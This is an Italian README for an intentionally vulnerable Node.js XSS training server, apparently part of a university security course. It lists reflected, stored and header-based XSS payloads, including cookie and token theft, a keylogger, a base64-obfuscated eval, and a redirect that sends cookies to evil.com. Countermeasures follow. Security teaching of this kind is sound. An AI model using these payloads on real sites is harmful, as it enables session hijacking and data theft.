# XSS (Cross-Site Scripting) Vulnerability Demo

⚠️ **ATTENZIONE: Questa applicazione è intenzionalmente vulnerabile per scopi educativi!**

Questo server Node.js dimostra varie tipologie di vulnerabilità XSS (Cross-Site Scripting) in modo accademico, simile al server SQL Injection presente nella directory `SQLInjection/`.

## 🎯 Obiettivi Educativi

- Comprendere i diversi tipi di attacchi XSS
- Vedere come gli attacchi XSS possono compromettere sessioni e rubare dati
- Imparare l'importanza della sanitizzazione dell'input
- Dimostrare tecniche di exfiltrazione dati tramite XSS
- Mostrare vulnerabilità basate su header HTTP e token di sessione

## 🚀 Installazione e Avvio

```bash
# Installa le dipendenze
npm install

# Avvia il server
npm start

# Oppure usa nodemon per il development
npm run dev
```

Il server sarà disponibile su `http://localhost:3001`

## 🔴 Tipi di Vulnerabilità XSS Dimostrate

### 1. **Reflected XSS** (Non-Persistent)
Il payload viene eseguito immediatamente e "riflesso" nella risposta HTTP.

**Endpoint vulnerabili:**
- `GET /profile?name=<payload>`
- `GET /search?q=<payload>`

**Esempi di payload:**
```javascript
// Alert semplice
<script>alert('XSS')</script>

// Rubare cookie
<script>fetch('/steal-cookie?c='+document.cookie)</script>

// Image tag con onerror
<img src=x onerror=alert('XSS')>

// SVG con onload
<svg onload=alert(document.domain)>

// Base64 encoded
<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>
```

### 2. **Stored XSS** (Persistent)
Il payload viene memorizzato nel server e eseguito ogni volta che la pagina viene visualizzata.

**Endpoint vulnerabili:**
- `POST /comment` - Sistema di commenti
- `POST /guestbook` - Libro degli ospiti
- `POST /update-profile` - Aggiornamento profilo utente

**Esempi di payload:**
```javascript
// Script persistente
<script>alert('Stored XSS')</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('/keylog?key='+e.key)}</script>

// Cookie theft persistente
<img src=x onerror=fetch('/steal-cookie?source=stored&c='+document.cookie)>

// Redirect malevolo
<script>window.location='http://evil.com/steal?data='+document.cookie</script>
```

### 3. **Header-based XSS**
XSS tramite manipolazione degli header HTTP (User-Agent, Referer, etc.).

**Endpoint vulnerabile:**
- `GET /header-info`

**Esempi di attacco:**
```bash
# Modifica User-Agent
curl -H "User-Agent: <script>alert('Header XSS')</script>" http://localhost:3001/header-info

# Referer malevolo
curl -H "Referer: javascript:alert('XSS')" http://localhost:3001/header-info

# Custom header
curl -H "X-Forwarded-For: <img src=x onerror=alert('XSS')>" http://localhost:3001/header-info
```

### 4. **Session/Token-based Attacks**
Dimostrazione di come XSS può compromettere sessioni e rubare token di autenticazione.

**Funzionalità:**
- Login con token insicuri (`POST /login`)
- Dashboard con informazioni sensibili (`GET /dashboard`)
- Cookie non protetti (httpOnly: false)

**Esempi di attacco:**
```javascript
// Rubare tutti i cookie
<script>fetch('/steal-cookie?c='+document.cookie)</script>

// Rubare session token specifico
<script>
  let token = document.cookie.match(/authToken=([^;]+)/)[1];
  fetch('/steal-token?token='+token);
</script>

// Session hijacking
<script>fetch('/hijack?session='+document.cookie)</script>
```

## 🎯 Scenari di Attacco Completi

### Scenario 1: Account Takeover tramite Stored XSS
1. Attaccante inserisce payload XSS nel sistema di commenti
2. Quando l'admin visualizza i commenti, il payload ruba il suo token di sessione
3. L'attaccante usa il token per impersonare l'admin

### Scenario 2: Data Exfiltration
1. Attaccante inserisce keylogger XSS nel guestbook
2. Tutti i visitatori che digitano sulla pagina inviano i tasti all'attaccante
3. L'attaccante raccoglie password e dati sensibili

### Scenario 3: Phishing tramite DOM Manipulation
1. Attaccante usa XSS per modificare il contenuto della pagina
2. Inserisce un form di login falso
3. Gli utenti inseriscono le credenziali nel form fasullo

## 📊 Endpoint per Monitoraggio

- `GET /stolen-data` - Visualizza tutti i dati "rubati" dagli attacchi XSS
- `GET /comments` - Visualizza tutti i commenti (stored XSS execution)
- `GET /guestbook-view` - Visualizza libro degli ospiti (stored XSS execution)
- `GET /api/users` - API per ottenere lista utenti
- `POST /clear-stolen-data` - Cancella i dati rubati

## 🔍 Tecniche di Bypass

### Filtri Base64
```javascript
<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>
```

### Event Handlers Alternativi
```javascript
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
```

### JavaScript senza Script Tag
```javascript
<img src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">Click me</a>
```

## 🛡️ Contromisure (NON Implementate)

Questo server è **intenzionalmente vulnerabile**. Le seguenti contromisure dovrebbero essere implementate in applicazioni reali:

### Input Sanitization
```javascript
// Escape HTML characters
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

### Content Security Policy (CSP)
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  next();
});
```

### Secure Cookies
```javascript
res.cookie('authToken', token, {
  httpOnly: true,    // Prevent XSS access
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
});
```

### Input Validation
```javascript
const validator = require('validator');

// Validate and sanitize input
const sanitizedInput = validator.escape(userInput);
```

## 🚨 Avvertenze di Sicurezza

- **MAI** utilizzare questo codice in produzione
- Questo server espone **intenzionalmente** multiple vulnerabilità
- È progettato esclusivamente per scopi educativi
- Eseguire solo in ambienti isolati di test
- Non esporre mai su reti pubbliche

## 📚 Risorse Aggiuntive

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

## 🔬 Per Studenti e Ricercatori

Questo progetto fa parte del corso di Cybersecurity dell'Università Sapienza di Roma. È progettato per:

1. **Comprendere** come funzionano gli attacchi XSS
2. **Sperimentare** con diversi tipi di payload
3. **Analizzare** l'impatto delle vulnerabilità XSS
4. **Apprendere** le tecniche di mitigazione

### Struttura del Codice

- **Vulnerabilità intenzionali**: Input non sanitizzato, cookie insicuri, header non validati
- **Simulazione di exfiltrazione**: Endpoint che raccolgono dati "rubati"
- **Diversi vettori di attacco**: Reflected, Stored, DOM-based, Header-based XSS
- **Interfaccia educativa**: Pagine HTML che spiegano ogni vulnerabilità

---

**Ricorda**: La sicurezza web è una responsabilità di tutti. Usa queste conoscenze per costruire applicazioni più sicure! 🛡️